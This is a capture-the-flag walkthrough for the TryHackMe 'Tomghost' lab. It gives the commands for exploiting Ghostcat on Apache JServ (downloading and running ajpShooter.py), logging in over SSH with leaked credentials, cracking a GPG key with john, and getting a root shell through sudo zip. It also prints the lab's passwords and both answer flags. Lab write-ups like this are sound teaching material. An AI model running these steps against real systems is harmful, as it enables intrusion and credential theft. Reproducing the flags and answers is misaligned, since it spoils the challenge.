# Solution

## URL
- [Tomghost](https://tryhackme.com/room/tomghost)

## Steps

### Enumerate
1. Run a full port scan using NMAP: `sudo nmap -v -sS -p- -A 10.10.179.55`.
2. We can see that port 8009 (Apache Jserv) is open. A quick google search reveals a vulnerability called ghostcat.

### Exploit
1. Download the exploit for it: `wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py`.
2. Run it: `python3 ajpShooter.py http://10.10.179.55:8080/ 8009 /WEB-INF/web.xml read`.
3. We get some credentials: `skyfuck:8730281lkjlkjdqlksalks`.
4. Trying to ssh using this: `ssh skyfuck@10.10.179.55` and password same as above. SUccessfully logged in.
5. We can now see two files in the users home directory, one is a private key and the other is an encrypted file.
6. Let's bring them to our machine: `scp skyfuck@10.10.179.55:/home/skyfuck/tryhackme.asc .` and `scp skyfuck@10.10.179.55:/home/skyfuck/credential.pgp .`

### Crack
1. Now lets try to crack the password for the private key.
2. First use `gpg2john` to convert the gpg file to hash that john can understand: `gpg2john tryhackme.asc > tryhackme.asc.hash`.
3. Then use john to crack it: `john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.asc.hash`. The password is `alexandru`.
4. In victim's machine, run: `gpg --import tryhackme.asc`.
5. Now run: `gpg -d credential.pgp` and enter the password we found.
6. We got some new credentials: `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`.

## PrivEsc
1. Now let's login as merlin: `su - merlin`.
2. In this user's home directory we found the file `user.txt`.
3. Reading that we get our first flag: `THM{GhostCat_1s_so_cr4sy}`.
4. Checking out merlin's sudo privileges, we get: `(root : root) NOPASSWD: /usr/bin/zip`. So merlin can use `/usr/bin/zip` as root user.
5. Check out [GTFPBins for zip](https://gtfobins.github.io/gtfobins/zip/).
6. Trying `sudo` methodology:
    ```
    TF=$(mktemp -u)
    sudo zip $TF /etc/hosts -T -TT 'sh #'
    ```
7. Running `whoami` we can see that we became `root`.
8. Find the required file: `find / -name root.txt -type f 2> /dev/null`
9. The file is in `/root/root.txt`, classic!
10. Reading the file for the flag: `THM{Z1P_1S_FAKE}`


### Task 1:
#### Compromise this machine and obtain user.txt
1. The answer is `THM{GhostCat_1s_so_cr4sy}`.

#### Escalate privileges and obtain root.txt
1. The answer is `THM{Z1P_1S_FAKE}`.